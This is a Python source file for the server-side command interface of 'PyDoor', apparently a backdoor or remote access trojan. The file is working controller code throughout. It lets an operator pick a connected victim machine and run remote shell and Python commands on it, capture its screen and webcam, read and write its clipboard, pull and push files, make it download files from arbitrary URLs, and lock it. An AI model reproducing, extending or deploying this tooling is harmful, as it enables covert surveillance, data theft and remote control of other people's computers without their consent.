""" Server CLI for PyDoor """
import cmd
import logging
import socket
from contextlib import suppress

from cryptography.hazmat.primitives.asymmetric import ec
from modules import (clipboard, download, filetransfer, screenshot,
                     shells, tasks, webcam, windows, helpers)
from modules.baseserver import BaseServer
from utils import terminal
from utils.timeout_handler import timeoutsetter

# Enables using arrowkeys on unix-like systems
with suppress(ImportError):
    import readline

logging.basicConfig(level=logging.DEBUG)
socket.setdefaulttimeout(10)

DEFAULT_PROMPT = "> "

MENU_HELP = """
Commands:

list
open (port)
shutdown
help
"""

INTERACT_HELP = """
Available commands:

ping
shell
python
screenshot
webcam
copy
paste
receive
send
download
lock [windows only]
tasks
stoptask (task id)
output (task id)
disconnect
exit
"""


class ServerCLI(BaseServer, cmd.Cmd):
    """ CLI for BaseServer """

    prompt = DEFAULT_PROMPT
    client = None

    def __init__(self, private_key: ec.EllipticCurvePrivateKey):
        BaseServer.__init__(self, private_key)
        cmd.Cmd.__init__(self)

    def default(self, _) -> None:
        """ Default error if command not found """
        print('Command was not recognized, type "help" for help.')

    def do_shutdown(self, _) -> bool:
        """ Shutdown the server """
        self.shutdown()
        return True

    def do_ping(self, _) -> None:
        """ Get client latency """
        if self.__check_select():
            return

        try:
            latency = self.ping(self.client)
        except TimeoutError:
            print("Client timed out.")
        else:
            print(f'Ping: {latency}ms')

    def do_help(self, _) -> None:
        """ Print help message """
        if self.client is None:
            print(MENU_HELP)
        else:
            print(INTERACT_HELP)

    def __check_select(self) -> bool | None:
        """ Check if a client is selected """
        if self.client is None:
            print("Select a client first.")
            return True

    def do_open(self, select_id: str) -> None:
        """ Interact with a client """
        if self.client is not None:
            print('A client has already been selected.')
            return

        if not select_id.strip():
            print("Usage: open (port)")
            return

        # Ensure clients don't get removed mid loop
        clients = self.clients().copy()

        # Find a client.port starting with select_id, default None
        self.client = next(
            (client for client in clients if str(client.port).startswith(select_id)),
            None)

        if self.client is None:
            print('Invalid port')
            return

        self.prompt = f'{self.client.address[0]}> '

    def do_exit(self, _) -> None:
        """ Go back to the client selection menu """
        if self.client is None:
            print("No client is selected. To shutdown the server, use 'shutdown'.")
            return

        self.client = None
        self.prompt = '> '

    def do_list(self, _) -> None:
        """ CLI for list """
        for client in self.clients():
            print(f'Port: {client.port} / Address: {client.address[0]}')

    def do_shell(self, _) -> None:
        """ Open a shell to client """
        if self.__check_select():
            return

        # Fetch current working directory
        cwd = helpers.getcwd(self.client)

        # Generate client platform specific prompt
        prompt = terminal.make_prompt(self.client, cwd)

        logging.debug('Launched shell (%s)', self.client.port)
        while True:
            command = input(prompt)

            # Check for cases where command only affects output visually
            match command.strip():
                case 'exit':
                    break
                case 'clear' | 'cls':
                    terminal.clear()
                    continue
                case '':
                    continue

            # Warn user when changing directory, that it does not persist between commands
            comm, *_ = command.split()
            if comm.lower() in ['cd', 'chdir']:
                print("Changing directory does not persist between commands!")
                print("It is recommended to use python to change directories.")

            try:
                print(shells.shell(self.client, command), end="")
            except TimeoutError:
                logging.error("Shell command timed out: %s", self.client.port)
                # Prompt user to increase timeout limit
                if not terminal.increase_timeout_prompt():
                    continue
                with timeoutsetter(self.client, None):
                    print(self.client.read().decode(), end="")

    def do_python(self, _) -> None:
        """ Open a python interpreter to client """
        if self.__check_select():
            return

        logging.debug('Launched python interpreter (%s)', self.client.port)
        while True:
            command = input('>>> ')

            if command.strip().lower() in ['exit', 'exit()']:
                break

            print(shells.python(self.client, command), end='')

    def do_screenshot(self, _) -> None:
        """ Take a screenshot and save it in a file """
        if self.__check_select():
            return

        try:
            filename = screenshot.screenshot(self.client)
        except RuntimeError as error:
            print(str(error))
        else:
            print(f'Saved screenshot: {filename}')

    def do_webcam(self, _) -> None:
        """ Capture webcam """
        if self.__check_select():
            return

        try:
            filename = webcam.webcam(self.client)
        except RuntimeError as error:
            print(str(error))
        else:
            print(f'Saved webcam capture: {filename}')

    def do_copy(self, _) -> None:
        """ Copy to client clipboard """
        if self.__check_select():
            return

        text = input('Text to copy: ')
        try:
            clipboard.copy(self.client, text)
        except RuntimeError as error:
            print(str(error))
        else:
            print('Copied to clipboard successfully')

    def do_paste(self, _) -> None:
        """ Paste from client clipboard """
        if self.__check_select():
            return

        try:
            content = clipboard.paste(self.client)
        except RuntimeError as error:
            print(str(error))
        else:
            print(f'Clipboard:\n"{content}"')

    def do_receive(self, _) -> None:
        """ Receive a file from the client """
        if self.__check_select():
            return

        filename = input('File to transfer: ')
        save_name = input('Save file as: ')
        try:
            filetransfer.receive(self.client, filename, save_name)
        except RuntimeError as error:
            print(str(error))
        else:
            print('File transferred successfully')

    def do_send(self, _) -> None:
        """ Send a file to client """
        if self.__check_select():
            return

        filename = input('Filename: ')
        save_name = input('Save file as: ')
        try:
            filetransfer.send(self.client, filename, save_name)
        except PermissionError:
            print('Insufficient permissions to read file.')
        except FileNotFoundError:
            print('File does not exist.')
        except RuntimeError as error:
            print(str(error))
        else:
            print('File transferred successfully')

    def do_download(self, _) -> None:
        """ Make the client download a file from the web """
        if self.__check_select():
            return

        url = input('File URL: ')
        filename = input('Save file as: ')
        try:
            download.download(self.client, url, filename)
        except RuntimeError as error:
            print(str(error))
        else:
            print("File is downloading in the background.")

    def do_lock(self, _) -> None:
        """ Lock client machine """
        if self.__check_select():
            return

        try:
            windows.lock_machine(self.client)
        except RuntimeError as error:
            print(str(error))
        else:
            print('Successfully locked client machine.')

    def do_tasks(self, _) -> None:
        """ Fetch all running tasks """
        if self.__check_select():
            return

        self.client.tasklist = tasks.tasks(self.client)
        terminal.task_print(self.client.tasklist)

    def do_stoptask(self, task_id: str) -> None:
        """ Stop a task on a client """
        if self.__check_select():
            return

        task_id = task_id.strip()

        if not task_id:
            print("Usage: stoptask (task id)")
            return

        # Find complete task identifier
        identifier = tasks.find(self.client.tasklist, task_id)
        if identifier is None:
            print("Task doesn't exist.")
            return

        try:
            tasks.stoptask(self.client, identifier)
        except RuntimeError as error:
            print(str(error))
        else:
            print('Stopped task.')

    def do_output(self, task_id: str) -> None:
        """ Given a task id, get output from finished task from client """
        if self.__check_select():
            return

        task_id = task_id.strip()

        if not task_id:
            print("Usage: output (task id)")
            return

        identifier = tasks.find(self.client.tasklist, task_id)
        if identifier is None:
            print("Task doesn't exist.")
            return

        try:
            output = tasks.output(self.client, identifier)
        except RuntimeError as error:
            print(str(error))
        else:
            print('Output from Task:\n')
            print(output)

    def do_disconnect(self, _) -> None:
        """ Disconnect a client """
        if self.__check_select():
            return

        self.disconnect(self.client)
        print("Disconnected client.")
        self.client = None
        self.prompt = DEFAULT_PROMPT


if __name__ == '__main__':
    from cryptography.hazmat.primitives import serialization

    # Read private key from file
    with open('private.pem', 'rb') as file:
        private_key = serialization.load_pem_private_key(file.read(), None)

    # Start server
    server = ServerCLI(private_key)
    server.start(('localhost', 6969))

    # Get a client that connected
    connection = server.connections_queue.get()
    print(f"{connection.port}".encode())

    # Start Server CLI
    while True:
        try:
            server.cmdloop()
        except (KeyboardInterrupt, ConnectionError):
            server.client = None
            server.prompt = DEFAULT_PROMPT
            print() # Start on a new line
        else:
            break
